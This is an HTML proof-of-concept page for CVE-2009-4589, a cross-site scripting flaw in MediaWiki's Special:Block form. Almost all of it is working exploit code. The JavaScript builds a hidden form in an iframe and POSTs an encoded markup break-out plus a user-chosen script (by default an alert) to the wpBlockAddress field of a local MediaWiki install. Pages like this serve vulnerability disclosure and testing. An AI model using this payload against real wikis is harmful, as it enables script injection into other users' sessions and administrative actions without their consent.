<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3. org/TR/html4/loose.dtd">
<HTML>
  
<HEAD>
<TITLE>CVE-2009-4589</TITLE>
</HEAD>

<BODY>

  <!-- <iframe id="frame" style="display:none;"></iframe> -->
  <iframe id="frame" height=500 width="100%"></iframe>
  
  <script type="text/javascript">
    
  function post_to_url(path, params, method) {
    method = method || "post";

    var mediawiki = document.getElementById("frame").contentDocument;

    var form = mediawiki.createElement("form");
    form.setAttribute("method", method);
    form.setAttribute("action", path);

    for(var key in params) {
        var hiddenField = mediawiki.createElement("input");
        hiddenField.setAttribute("type", "hidden");
        hiddenField.setAttribute("name", key);
        hiddenField.setAttribute("value", params[key]);

        form.appendChild(hiddenField);
    }

    mediawiki.body.appendChild(form);

    form.submit();
  }

  <!-- xss -->
  function post(){
      post_to_url( "http://localhost:8888/index.php?title=Special:Block&action=submit",
                  { "wpBlockAddress" : 
                  unescape("%22%3E%3C%2F%61%3E")
                  + document.getElementById("script").value },
                  "POST" );
  }
</script>

  <p> Type sth to exploit </p>
  <input id="script" value="<script>alert(1)</script>"></input>
  <br/>
  <a href="####" onclick="javascript:post()">xss</a>
  
</BODY>
</HTML>
